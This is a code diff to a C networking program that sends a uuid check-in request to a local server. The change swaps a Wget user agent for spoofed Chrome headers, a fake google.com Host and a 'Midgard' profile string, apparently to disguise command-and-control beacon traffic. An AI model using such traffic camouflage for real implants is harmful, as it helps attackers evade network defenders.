@@ -10,6 +10,7 @@
 
 #define HOST "127.0.0.1"
 #define PORT 8000
+#define PROFILE "Midgard"
 
 int connection(struct io_uring *ring, request_t *req) {
     const char *host = HOST;
@@ -63,12 +64,23 @@ void send_get(struct io_uring *ring, request_t *req, const char *uuid) {
     struct io_uring_cqe *cqe;
     char request_buffer[2048];
     int req_len = snprintf(request_buffer, sizeof(request_buffer),
+
         "GET /login?uuid=%s HTTP/1.1\r\n"
         "Host: google.com\r\n"
-        "User-Agent: Wget/1.20.3 (linux-gnu)\r\n"
-        "Accept: */*\r\n"
+        "Accept-Language: en-US,en;q=0.\r\n"
+        "Upgrade-Insecure-Requests: 1\r\n"
+        "User-Agent: %s/324.54 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+        "Sec-Ch-Ua-Mobile: ?0\r\n"
+        "X-Client-Data: CNGLywE=\r\n"
+        "Sec-Fetch-Site: none\r\n"
+        "Sec-Fetch-Mode: navigate\r\n"
+        "Sec-Fetch-User: ?1\r\n"
+        "Sec-Fetch-Dest: document\r\n"
+        "Accept-Encoding: gzip, deflate, br\r\n"
+        "Priority: u=0, i\r\n"
         "Connection: close\r\n\r\n",
-        uuid);
+        uuid, PROFILE);
 
     sqe = io_uring_get_sqe(ring);
     io_uring_prep_send(sqe, req->client_socket, request_buffer, req_len, 0);
